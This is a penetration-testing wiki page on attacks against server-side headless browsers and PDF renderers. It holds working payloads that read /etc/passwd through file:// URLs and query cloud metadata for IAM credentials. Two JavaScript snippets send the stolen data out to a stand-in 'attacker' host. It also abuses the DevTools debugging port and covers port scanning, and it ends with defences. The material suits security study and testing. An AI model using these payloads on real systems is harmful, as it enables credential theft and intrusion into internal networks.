---
title: "Headless Browser Attacks"
type: technique
tags: [ssrf, headless, pdf, rce, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-headlessbrowser]
---

# Headless Browser Attacks

## What it is

A headless browser (Chrome/Puppeteer/Playwright, wkhtmltopdf, Prince) renders pages server-side for PDF/screenshot generation, link previews, and scraping. If you control its input URL or HTML, you can read local files, SSRF the internal network and cloud metadata, hit the remote debugging port, or get XSS-to-RCE. A very common modern SSRF sink - pairs with [[wiki/techniques/web/ssrf]].

## Attack surface signals
"Export/Download as PDF", invoice/report generators, screenshot/preview features, HTML-to-image, URL unfurling (chat/social), and "render this URL" endpoints. If your input reaches a server-side render, this applies.

## Local file read
PDF/screenshot of attacker HTML can pull local files when file access is not restricted:
```html
<script>window.location="file:///etc/passwd"</script>
<iframe src="file:///etc/passwd" height="800" width="800"></iframe>
```
Insecure launch flags make it trivial:
```javascript
// if Chrome runs with --allow-file-access-from-files (often + --no-sandbox)
async function x(){let f=await (await fetch("file:///etc/passwd")).text();
  fetch("https://attacker/",{method:"POST",body:f});}
x();
```
`wkhtmltopdf` historically allowed `file://` and SSRF by default (many CVEs) - test `<iframe src=file:///...>` and `<img src=...>` directly.

## SSRF (internal + cloud metadata)
The renderer fetches your URLs server-side - point it at internal services and metadata:
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>fetch('https://attacker/?'+btoa(d)))</script>
```
AWS IMDSv2 needs a header (use `fetch` with the PUT token flow); GCP/Azure need their metadata headers - see [[imds-cloud-metadata]]. Internal apps/admin panels are reachable too.

## Remote debugging port
The DevTools Protocol on `9222` = full browser control if reachable:
```
http://127.0.0.1:9222/json/version          # leak websocket UUID + version
http://127.0.0.1:9222/json                   # list tabs
# connect a CDP client to the ws:// URL -> read cookies, saved creds, history, eval JS
```
Reach it via SSRF/rebinding. Since Chrome 136 the default profile is restricted unless `--user-data-dir` is set, and websocket needs `--remote-allow-origins=*`.

## Internal network scanning
- **Timing port scan:** `<img>` to `host:port`, measure `onerror` timing (open vs closed differ). Chrome blocks known ports.
- **DNS rebinding:** force an external IPv6 then drop it so the browser falls back to an internal IPv4 on the same origin - see [[dns-rebinding]].

## Real-world
wkhtmltopdf/`pdfkit`/`wkhtml`-based exporters have repeated SSRF+LFR CVEs and many HackerOne reports (PDF export -> read `/etc/passwd` or AWS creds). Puppeteer/Playwright "render my URL" features are a recurring SSRF bug-bounty class.

## Detection and defence
Disable `file://` and local file access; run the renderer in a locked-down container/network namespace with **no** access to metadata/internal IPs (egress allowlist); never use `--no-sandbox`/`--allow-file-access-from-files`; bind the debugging port to nothing or authenticate it; validate/allowlist the input URL; strip dangerous tags from user HTML.

## Tools
Burp ([[burp-suite]]) + Collaborator (OOB), a CDP client (`chrome-remote-interface`), [[wiki/techniques/web/ssrf]] payloads, [[imds-cloud-metadata]]. Driven by the `hunt-ssrf` skill.

## Sources
- PayloadsAllTheThings - Headless Browser
